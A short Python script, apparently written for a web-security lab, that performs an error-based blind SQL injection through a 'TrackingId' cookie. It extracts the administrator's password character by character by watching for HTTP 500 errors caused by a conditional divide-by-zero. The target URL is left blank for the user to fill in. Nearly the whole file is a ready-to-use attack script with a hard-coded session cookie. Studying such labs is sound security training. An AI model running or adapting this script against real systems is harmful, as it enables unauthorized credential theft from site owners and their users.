import pwn,sys,requests,string,time,signal,pdb

def interrupt_handler(signum,frame):
    print("\n\n[!] Saliendo ...\n")
    sys.exit(1)
# ctrl + C
signal.signal(signal.SIGINT, interrupt_handler)

def bruteForceString():
    main_url = '' # insert the url that you want to apply brute force
    characters = string.ascii_lowercase + string.digits
    string_requested = ""
    p1 = pwn.log.progress("Brute Force")
    #p1.status("Iniciating brute force attack")

    #p2 = pwn.log.progress("Password")

    for position in range (1,21):
        for character in characters:
            #example of payload with SQL injection
            cookies = {   
                'TrackingId': f"48StlKdAhv4LoqfI' || (select case when (1=1) then TO_CHAR(1/0) else '' end from users where username='administrator' and substr(password,{position},1) = '{character}') || '",
                'session': 'GTVBXohYMzU9ER740JePuI71tcIIhNsz'
            }

            #p1.status(cookies['TrackingId'])
            r = requests.get(main_url,cookies=cookies) 
            if r.status_code == 500: #status code
                string_requested += character
                print(string_requested)
                break
    print(string_requested)


if __name__ == '__main__':
    
    bruteForceString()

